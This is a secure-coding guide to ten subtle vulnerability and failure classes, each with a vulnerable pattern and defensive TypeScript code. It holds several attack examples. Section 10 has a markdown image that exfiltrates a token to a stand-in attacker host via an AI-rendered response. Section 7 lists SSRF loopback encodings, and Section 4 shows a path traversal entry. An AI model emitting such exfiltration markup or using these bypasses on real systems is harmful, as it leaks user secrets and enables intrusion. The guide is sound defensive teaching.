# 🎯 DOCTRINE 05: ELUSIVE NICHE ATTACK & FAILURE VECTORS

> **Core Axiom**: The most catastrophic security breaches and production outages stem not from obvious beginner mistakes, but from subtle language quirks, edge-case arithmetic, and protocol corner cases that AI assistants frequently overlook.

---

## 1. Timing Attacks & Constant-Time Comparisons

Standard string equality (`a === b`) short-circuits on the first mismatched character. An attacker measuring microsecond response times over millions of requests can deduce secret API tokens, HMAC signatures, or password hashes character-by-character.

```typescript
// ❌ VULNERABLE (Leaks token characters via timing side-channel)
if (userProvidedSignature === expectedSignature) { ... }

// 🛡️ SECURE-CODE (Constant-time comparison)
import crypto from "crypto";
const isValid = crypto.timingSafeEqual(
  Buffer.from(userProvidedSignature, "utf8"),
  Buffer.from(expectedSignature, "utf8")
);
```

---

## 2. Floating-Point Financial Drift

IEEE-754 binary floating-point representation cannot accurately represent decimal fractions like `0.1` or `0.2` (`0.1 + 0.2 = 0.30000000000000004`). In financial ledgers, multiplying unit prices by quantities or tax rates using floats leads to rounding discrepancies, balance drift, and audit failures.

```typescript
// ❌ VULNERABLE (Accumulates rounding errors and precision loss)
const price = 19.99;
const tax = price * 0.0825; // 1.649175 -> Float drift

// 🛡️ SECURE-CODE (Integer Minor Units / Cents Math)
const priceInCents = 1999n;
const taxRateBasisPoints = 825n; // 8.25% in basis points (1/10000)
const taxInCents = (priceInCents * taxRateBasisPoints + 5000n) / 10000n; // Half-up rounding
```

---

## 3. Unicode Homoglyph & Normalization Attacks

An attacker registers the username `аdmin` using the Cyrillic character `а` (`U+0430`) instead of Latin `a` (`U+0061`). Without normalization, unique database constraints treat them as distinct strings, allowing attackers to impersonate system administrators or bypass authorization checks.

```typescript
// 🛡️ SECURE-CODE (Mandatory NFKC Unicode Normalization)
function sanitizeIdentifier(raw: string): string {
  return raw
    .normalize("NFKC") // Normalizes visual homoglyphs and compatibility characters
    .trim()
    .toLowerCase();
}
```

---

## 4. Zip Slip, Zip Bombs & Archive Traversal

Extracting uploaded ZIP or TAR archives without validating file paths allows attackers to overwrite critical system files (`/etc/passwd`, application code) via relative paths like `../../../../var/www/index.js`. Furthermore, "Zip Bombs" (tiny 1MB files expanding to 1TB) trigger catastrophic disk and RAM exhaustion.

```typescript
// 🛡️ SECURE-CODE (Safe Streaming Archive Extraction)
import path from "path";

const DESTINATION_DIR = "/var/app/uploads/extracted";
const MAX_TOTAL_BYTES = 50 * 1024 * 1024; // 50MB max uncompressed quota
let totalExtractedBytes = 0;

function extractEntry(entryName: string, entryStream: NodeJS.ReadableStream) {
  const targetPath = path.resolve(DESTINATION_DIR, entryName);
  
  // Guard 1: Zip-Slip Path Traversal Check
  if (!targetPath.startsWith(DESTINATION_DIR + path.sep)) {
    throw new SecurityError(`Illegal archive entry path: ${entryName}`);
  }

  // Guard 2: Decompression Ratio / Zip Bomb Threshold Check
  entryStream.on("data", (chunk: Buffer) => {
    totalExtractedBytes += chunk.length;
    if (totalExtractedBytes > MAX_TOTAL_BYTES) {
      entryStream.destroy();
      throw new SecurityError("Decompression quota exceeded (Zip Bomb detected)");
    }
  });
}
```

---

## 5. Pixel Flood & Decompression Bombs

Attackers can upload a seemingly innocuous 10KB PNG file whose headers specify dimensions of `65,535 x 65,535` pixels. When decoded by image processors (e.g., Canvas, Sharp, Pillow), the runtime attempts to allocate over 16GB of uncompressed RGBA pixel buffers in memory, triggering instant Out-Of-Memory (OOM) crashes.

### Defense Rule:
Inspect image dimensions from file header metadata **before** initiating full memory buffer decoding. Reject any image exceeding maximum application bounds (e.g. `4096 x 4096`).

---

## 6. EXIF GPS Metadata Leaks

User-uploaded images (JPEG/HEIC) captured by smartphones contain embedded EXIF metadata, including the user's exact latitude, longitude, altitude, device model, and timestamp. Serving raw user avatars publicly exposes their private residential coordinates.

### Defense Rule:
All uploaded media MUST pass through an automated metadata strip pipeline (e.g. `sharp.strip()` or `exiftool -all=`) prior to persistent storage or public serving.

---

## 7. DNS Rebinding & SSRF Alternate Encodings

Attackers bypass SSRF filters that check hostnames by using:
1. **DNS Rebinding**: A domain whose DNS server returns a valid public IP on the first lookup (TTL=0), but returns `127.0.0.1` on the second lookup when the backend actually initiates the HTTP connection.
2. **Hex/Octal/Decimal IP Encodings**: `http://2130706433` (decimal for `127.0.0.1`), `http://0x7f000001` (hex), or `http://[::ffff:127.0.0.1]` (IPv4-mapped IPv6).

### Defense Protocol:
Resolve the hostname to a socket IP address, validate that the raw parsed IP is NOT in any private or loopback CIDR block, and open the socket **directly to that validated IP address**, pinning the `Host` header to the original domain.

---

## 8. Cross-Site WebSocket Hijacking (CSWSH)

Because browsers include cookies automatically during WebSocket upgrade handshakes, a malicious website can open a WebSocket connection to `wss://your-bank.com/ws`. If the server does not validate the `Origin` header during the HTTP upgrade request, the attacker gains full authenticated two-way communication on behalf of the victim.

```typescript
// 🛡️ SECURE-CODE (Origin Handshake Validation)
server.on("upgrade", (req, socket, head) => {
  const origin = req.headers.origin;
  const ALLOWED_ORIGINS = new Set(["https://your-domain.com"]);

  if (!origin || !ALLOWED_ORIGINS.has(origin)) {
    socket.write("HTTP/1.1 403 Forbidden\r\n\r\n");
    socket.destroy();
    return;
  }
  // Proceed with WebSocket upgrade
});
```

---

## 9. Cache Stampede & The XFetch Algorithm (Thundering Herd)

Under high traffic (e.g. 10,000 RPS), when a popular cache key expires, thousands of concurrent requests miss the cache simultaneously and all execute the heavy database query at once, causing database CPU spikes and cascading outages.

### Defense: Probabilistic Early Expiration (XFetch)
Instead of waiting for a key to strictly expire, background threads probabilistically recalculate the value before expiration based on how long the computation took:
$$\Delta - \beta \times \ln(\text{rand}()) > \text{TTL}$$
Where $\Delta$ is the computation delta time and $\beta > 0$. If this evaluates to true, the request recalculates the cache while serving the existing cached value to all other callers.

---

## 10. Reverse Tabnapping & Markdown Image Exfiltration

1. **Reverse Tabnapping**: Any external link with `target="_blank"` MUST include `rel="noopener noreferrer"`. Otherwise, the target window can alter `window.opener.location` to redirect the user to a phishing page.
2. **Markdown Image Exfiltration**: When rendering AI-generated or user-generated markdown, strip or restrict `<img>` tags pointing to external untrusted origins to prevent exfiltrating session tokens via URL parameters (`![img](https://attacker.com/leak?data=TOKEN)`).
